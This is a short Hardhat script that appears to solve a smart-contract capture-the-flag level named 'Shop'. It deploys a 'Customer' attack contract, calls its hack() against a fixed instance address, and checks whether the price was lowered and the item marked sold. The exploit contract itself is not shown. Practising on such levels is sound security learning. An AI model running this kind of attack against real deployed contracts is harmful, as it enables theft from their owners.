import { ethers } from "hardhat";

const INSTANCE = "0x17f711f72Ce90B31228cE493587892d30637aeA4";

async function main() {
  const shop = await ethers.getContractAt("Shop", INSTANCE);
  // const Shop = await ethers.getContractFactory("Shop");
  // const shop = await Shop.deploy();
  // await shop.deployed();

  const prePrice = (await shop.price()).toNumber();

  const Customer = await ethers.getContractFactory("Customer");
  const customer = await Customer.deploy();
  await customer.deployed();

  const tx = await customer.hack(shop.address);
  await tx.wait();

  (await shop.price()).toNumber() < prePrice && (await shop.isSold())
    ? console.log("=== 🎉🎉Successfully attack the contract 🎉🎉 ===")
    : console.log("=== Attack contract failed ===");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
